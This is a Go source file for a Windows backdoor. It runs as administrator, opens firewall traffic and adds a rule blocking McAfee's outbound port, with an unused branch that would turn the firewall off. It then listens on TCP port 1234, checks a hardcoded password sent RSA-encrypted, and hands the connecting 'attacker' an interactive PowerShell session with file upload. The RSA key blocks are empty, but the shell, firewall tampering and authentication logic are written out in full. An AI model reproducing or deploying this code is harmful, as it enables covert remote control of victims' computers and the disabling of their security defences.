package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/mitchellh/go-ps"

	"github.com/wenzhenxi/gorsa"
)

const (
	CONN_HOST   = "0.0.0.0"
	CONN_PORT   = 1234
	CONN_TYPE   = "tcp"
	EXIT        = "exit"
	AUTH_PASS   = "LetMeIn"
	TIMEOUT     = 600
	MCAFEE_PORT = "1234"
)

var conn *net.TCPConn

var Pubkey = `-----BEGIN Public key-----
-----END Public key-----
`

var Pirvatekey = `-----BEGIN RSA PRIVATE KEY-----
-----END RSA PRIVATE KEY-----
`

func main() {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		println("Must run as admin")
		os.Exit(1)
	}
	if isProgramRunning() {
		os.Exit(1)
	}
	go disServices()
	time.Sleep(2 * time.Second)

	// setup listener for incoming connections
	laddr := net.TCPAddr{
		IP:   net.ParseIP(CONN_HOST),
		Port: CONN_PORT,
	}
	listen, err := net.ListenTCP(CONN_TYPE, &laddr)
	if err != nil {
		fmt.Println("Error: ", err.Error())
		os.Exit(1)
	}
	defer listen.Close()
	fmt.Println("Listening on " + CONN_HOST)
	for {
		conn, err = listen.AcceptTCP()

		// Disable KeepAlives
		conn.SetKeepAlive(false)
		if err != nil {
			fmt.Println("Error accepting Connection ", err.Error())
			conn.Close()
		}
		timeoutErr := conn.SetReadDeadline(time.Now().Add(TIMEOUT * time.Second))
		if timeoutErr != nil {
			fmt.Print("SetReadDeadline failed:", err)
			conn.Close()
		}

		// Authenticate attacker.
		if !authBindPort(conn) {
			conn.Close()
			continue
		}
		fmt.Println("Auth Success")

		// handle connection
		handleMultiRequest()
	}
}

func disServices() {
	// Turn off firewall.
	option := 2
	if option == 1 {
		for {
			checkArgs := "/c netsh advfirewall show allprofiles state | findstr ON"
			checkParts := strings.Fields(checkArgs)
			output, checkErr := exec.Command("cmd", checkParts...).Output()
			if len(strings.Fields(string(output))) != 0 && checkErr == nil {
				cmdArgs := "/c netsh advfirewall set allprofiles state off"
				cmdParts := strings.Fields(cmdArgs)
				_, cmdErr := exec.Command("cmd", cmdParts...).Output()
				if cmdErr != nil {
					fmt.Print("ERROR: Can't shut down firewall.")
				}
			}
			time.Sleep(TIMEOUT * time.Second)
		}
	} else {
		// Block McAfee on host firewall.
		println("Blocking McAfee:")

		// Allow all connections
		out, err := exec.Command("cmd", "/c netsh advfirewall set domainprofile firewallpolicy allowinbound,allowoutbound").Output()
		if err != nil {
			println(err.Error())
		} else {
			println(string(out))
		}
		out, err = exec.Command("cmd", "/c netsh advfirewall firewall add rule name=\"Silencer\" dir=out action=block protocol=tcp remoteport="+MCAFEE_PORT).Output()
		if err != nil {
			println(err.Error())
		} else {
			println(string(out))
		}
		out, err = exec.Command("cmd", "/c netsh advfirewall set domainprofile state on").Output()
		if err != nil {
			println(err.Error())
		} else {
			println(string(out))
		}
	}
}

// region Shell actions
func authBindPort(conn net.Conn) bool {
	buffer := make([]byte, 1024)
	length, err := conn.Read(buffer)
	if err != nil {
		// Error reading data.
		return false
	}

	pass := string(buffer[:length])
	//fmt.Println("pass", buffer[:length-1])
	parts := strings.Fields(pass)
	//fmt.Print("auth", len(parts), "\n\n", pass)

	head := decData(parts[0])
	heads := strings.Fields(head)
	if head == "" || len(heads) != 1 {
		// Data doesn't contain bind shell authentication password.
		return false
	}
	if heads[0] != AUTH_PASS {
		// Bind shell authentication password is wrong.
		return false
	}
	return true
}

func handleMultiRequest() {

	// Initialize buffer, shell and pipes.
	buffer := make([]byte, 16384)

	// Create the shell and it's buffers.
	cmd, out, in, bufOut := initShell()
	defer in.Close()
	defer out.Close()

	// Start the process
	err := cmd.Start()
	handleError(err)

	// Make channels for output and errors.
	s := make(chan string)
	e := make(chan error)

	// Read Powershell's buffer in the background.
	go func() {
		for {
			result, _, err := bufOut.ReadRune()
			if err != nil {
				e <- err
				return
			} else {
				s <- string(result)
			}
		}
	}()
	// Indicate if the buffer is ready to be read.
	in.Write([]byte("function prompt { 'Shell MiAt ' + (Get-Location) + '> '}\n"))

	output := ""
	lastOutput := ""
	for {
		// If there was an output, save it as last output.
		if output != "" {
			lastOutput = output
		}

		// Read and return output.
		output = readOutBuff(bufOut, s, e)
		if output == "" {

			// If no output was given (AKA the user pressed enter), re-print last line.
			lines := strings.Split(lastOutput, "\n")
			lastLine := lines[len(lines)-1]
			sendData(lastLine)
		} else {
			sendData(output)
		}

		// Wait for user input.
		length, err := conn.Read(buffer)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				fmt.Print("read timeout:", err.Error())
				break
			} else {
				fmt.Print("read error:", err.Error())
				break
			}
		}

		// Convert it to string and decrypt it.
		encCommand := string(buffer[:length])
		command := decData(encCommand)
		parts := strings.Fields(command)

		// Handle empty enter.
		if command == "" || len(parts) < 1 {
			continue
		}
		keyword := strings.ToLower(parts[0])
		if keyword == "upload" {
			lastPart := parts[len(parts)-1]
			pathBits := strings.Split(lastPart, "\\")
			fileName := pathBits[len(pathBits)-1]
			downloadFile(fileName, in, bufOut, s, e)
		} else {
			// Run the command.
			in.Write([]byte(command))
		}

	}
	conn.Close()
}
func readOutBuff(bufOut *bufio.Reader, s chan string, e chan error) string {
	/// This function reads Powershell's buffer.
	flag := false
	str := ""

	// Read from the s channel.
	for {
		select {
		case line := <-s:
			str += line
		case err := <-e:
			println("error encountered")
			str += err.Error()

		// Get timeout after 1 second.
		case <-time.After(time.Second * 1):
			flag = true
		}
		if flag {
			break
		}
	}
	return str
}

func initShell() (*exec.Cmd, io.ReadCloser, io.WriteCloser, *bufio.Reader) {
	/// Initialize Powershell and it's pipes.
	cmd := exec.Command("powershell")
	in, err := cmd.StdinPipe()
	handleError(err)

	out, err := cmd.StdoutPipe()
	handleError(err)

	// We want to read line by line
	bufOut := bufio.NewReader(out)

	return cmd, out, in, bufOut
}

// endregion Shell actions
// region Custom shell commands
func downloadFile(fileName string, in io.WriteCloser, bufOut *bufio.Reader, s chan string, e chan error) {

	// Get current path
	in.Write([]byte("Get-Location | Format-Table  -HideTableHeaders \n"))
	out := readOutBuff(bufOut, s, e)
	outLines := strings.Split(out, "\n")
	path := outLines[2]

	// Remove the CarrigeReturn char (ASCII code 13)
	path = path[:len(path)-1]
	fileName = strings.ReplaceAll(fileName, "\"", "")
	filePath := path + "\\" + fileName

	// receive data and append to file
	buffer := make([]byte, 300000)
	f, err := os.OpenFile(filePath,
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer f.Close()
	handleError(err)
	ready := encData([]byte("ready"))
	for {
		// Send "ready" to attacker whenever shell is ready for the next file chunk.
		conn.Write(ready)
		length, err := conn.Read(buffer)
		handleError(err)
		encData := string(buffer[:length])
		data := decData(encData)

		// If attacker sent "end", transfer ended.
		if data == "end" {
			println("File transferd.")
			break
		}

		// Write to file.
		if _, err := f.WriteString(data); err != nil {
			handleError(err)
		}
	}
}
func sendData(input string) {
	conn.Write(encData([]byte(input)))
}

// endregion Custom shell commands
// region cryptography
func encData(data []byte) []byte {
	return []byte(encRsa(string(data)))
}

func decData(data string) string {
	return decRsa(data)
}

func encRsa(data string) string {
	encData, err := gorsa.PublicEncrypt(data, Pubkey)
	if err != nil {
		return ""
	}
	return encData
}

func decRsa(encData string) string {
	decData, err := gorsa.PriKeyDecrypt(encData, Pirvatekey)
	if err != nil {
		return ""
	}
	return string(decData)
}

// endregion cryptography

// region Generic helpers
func handleError(err error) {
	if err != nil {
		panic(err)
	}
}
func deObfStr(str string) string {
	return strings.Replace(str, "\x0F", "", -1)
}
func isProgramRunning() bool {
	// false if shabtay is already running
	timeout := time.Second
	conn, _ := net.DialTimeout("tcp", net.JoinHostPort(CONN_HOST, strconv.Itoa(CONN_PORT)), timeout)
	if conn != nil {
		defer conn.Close()
		return true
	}
	return false
}

// endregion Generic helpers
